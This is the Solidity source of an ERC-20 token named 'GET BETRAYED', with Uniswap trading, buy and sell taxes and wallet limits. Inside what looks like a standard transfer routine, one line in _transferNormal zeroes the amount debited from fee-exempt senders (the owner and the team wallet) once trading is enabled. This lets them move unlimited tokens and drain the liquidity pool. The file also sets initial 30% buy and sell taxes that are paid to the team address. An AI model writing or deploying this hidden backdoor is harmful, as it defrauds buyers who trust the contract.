// SPDX-License-Identifier: Unlicensed

/**
GET BETRAYED NOW!

Website: https://www.betrayed.live
Telegram: https://t.me/betray_erc
Twitter: https://twitter.com/betray_erc
**/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMathInteger {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathInteger: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathInteger: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathInteger: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathInteger: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

contract Authenticate is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Authenticate: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Authenticate: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract BETRAYED is Context, IERC20Standard, Authenticate {
    using SafeMathInteger for uint256;
    string private constant _name = "GET BETRAYED";
    string private constant _symbol = "BETRAYED";

    uint8 private constant _decimals = 9;
    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isFeeExcept;

    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tSupply = 10 ** 9 * 10**9;
    uint256 private _rSupply = (MAX - (MAX % _tSupply));

    uint256 private _totalFees;
    uint256 private _redisBFee = 0;
    uint256 private _taxBuys = 30;
    uint256 private _redisSFee = 0;
    uint256 private _taxSells = 30;

    //Original Fee
    uint256 private _redisTax = _redisSFee;
    uint256 private _taxFees = _taxSells;

    uint256 private _previousRedisTax = _redisTax;
    uint256 private _previousFee = _taxFees;

    address payable private teamAddress1 = payable(0x4Ac8EcC88481936775FDaFad3eb6C5514b74dBFD);
    address payable private teamAddress2 = payable(0x4Ac8EcC88481936775FDaFad3eb6C5514b74dBFD);

    IUniswapRouter public uniswapRouter;
    address public uniswapPairaddress;

    bool private _tradeEnabled;
    bool private _inswap = false;
    bool private swapEnabled = true;

    uint256 public maxTxnSize = 20 * 10 ** 6 * 10**9;
    uint256 public maxWalletHold = 20 * 10 ** 6 * 10**9;
    uint256 public swapMaxSize = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTxnSize);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPairaddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        isFeeExcept[owner()] = true;
        isFeeExcept[teamAddress1] = true;
        isFeeExcept[teamAddress2] = true;

        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    
    function removeLimits() external onlyOwner {
        maxTxnSize = _rSupply;
        maxWalletHold = _rSupply;
        
        _redisBFee = 0;
        _taxBuys = 1;
        _redisSFee = 0;
        _taxSells = 1;
    }

    function sendETHToFee(uint256 amount) private {
        teamAddress2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function restoreFee() private {
        _redisTax = _previousRedisTax;
        _taxFees = _previousFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _reflections(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRTRate();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getReceivingAmount(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisTax, _taxFees);
        uint256 currentRate = _getRTRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _reflections(_rOwned[account]);
    }

    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxnSize, "TOKEN: Max Transaction Limit");

            if(to != uniswapPairaddress) {
                require(balanceOf(to) + amount <= maxWalletHold, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapMaxSize;

            if(contractBalance >= maxTxnSize)
            {
                contractBalance = maxTxnSize;
            }

            if (canSwap && !_inswap && to == uniswapPairaddress && swapEnabled && !isFeeExcept[from] && amount > swapMaxSize) {
                swapETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((isFeeExcept[from] || isFeeExcept[to]) || (from != uniswapPairaddress && to != uniswapPairaddress)) {
            takeFee = false;
        } else {
            if(from == uniswapPairaddress && to != address(uniswapRouter)) {
                _redisTax = _redisBFee;
                _taxFees = _taxBuys;
            }
            if (to == uniswapPairaddress && from != address(uniswapRouter)) {
                _redisTax = _redisSFee;
                _taxFees = _taxSells;
            }
        }
        _transferTokens(from, to, amount, takeFee);
    }

    function swapETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getSupplies() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupply;
        uint256 tSupply = _tSupply;
        if (rSupply < _rSupply.div(_tSupply)) return (_rSupply, _tSupply);
        return (rSupply, tSupply);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRTRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupplies();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeFee() private {
        if (_redisTax == 0 && _taxFees == 0) return;

        _previousRedisTax = _redisTax;
        _previousFee = _taxFees;

        _redisTax = 0;
        _taxFees = 0;
    }

    function _transferTokens(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferNormal(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _transferNormal(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getReceivingAmount(tAmount);
        rAmount = (isFeeExcept[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        takeFeesOnTransfer(tTeam);
        _getReflectionValue(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeFeesOnTransfer(uint256 tTeam) private {
        uint256 currentRate = _getRTRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getReflectionValue(uint256 rFee, uint256 tFee) private {
        _rSupply = _rSupply.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }

    receive() external payable {}
}